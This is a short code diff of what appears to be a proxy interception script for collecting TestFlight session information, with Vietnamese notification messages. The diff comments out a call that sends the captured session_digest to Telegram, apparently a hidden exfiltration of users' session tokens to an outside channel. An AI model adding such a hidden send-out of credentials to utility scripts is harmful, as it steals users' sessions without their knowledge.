@@ -30,10 +30,10 @@ if (reg1.test($request.url)) {
     } else {
       $notification.post('Thu thập thông tin TF','Không thành công, vui lòng bật công tắc Mitm qua HTTP2 và khởi động lại VPN và Ứng dụng TestFlight!','')
     }
-    sendMessageToTelegram(
-                    `session_digest: ${session_digest}`
-                  );
-    //$done({})
+    // sendMessageToTelegram(
+    //                 `session_digest: ${session_digest}`
+    //               );
+    $done({})
 }
 /*
 if (reg2.test($request.url)) {
